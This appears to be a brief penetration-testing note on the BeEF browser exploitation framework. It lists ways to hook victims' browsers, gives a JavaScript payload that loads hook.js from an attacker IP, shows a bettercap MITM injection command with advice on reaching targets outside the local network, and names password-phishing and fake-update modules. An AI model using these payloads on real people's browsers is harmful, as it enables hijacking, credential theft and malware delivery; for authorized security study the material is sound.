# BeEF (Browser Exploitation Framework)

> https://beefproject.com, it comes installed with Kali Linux.

BeEF is a penetration testing tool that focuses on web browser by using client-side attacks vectors.

Targets need to be hooked (once they load a hook url) by:

* DNS spoof requests to a page containing the hook.
* Inject hook in browsed pages (MITM).
* XSS eploit.
* Social engineering the target to open a hook page (i.e, host website with Apache).
* Etc...

## MITM Bettercap injection example

We will use `hstshijack.cap` with a custom payload. Let's name our payload `inject_beef.js`:

```
const imported = document.createElement('script');
imported.src = 'http://<IP>:3000/hook.js`; // replace with your BeEF hook url
document.head.appendChild(imported);
```

> If you want to use this outside your network, you should replace IP with your REAL IP, not LAN IP, and configure IP forwarding so that your router forwards requests coming through your set up port to your machine.

And add to the caplet in `set hstshijack.payloads` value.

Then start bettercap...

```
bettercap -iface <CONNECTED_INTERFACE> -caplet /root/spoof.cap
```

## Social Engineering Attacks

There's a whole section for _Social Engineering_ with interesting tools such as:

* Extensions for dropping HTTPS
* Pretty Theft (authentication dialogs for requesting passwords)
* Fake Update Notification Bar (send hosted malicious file)
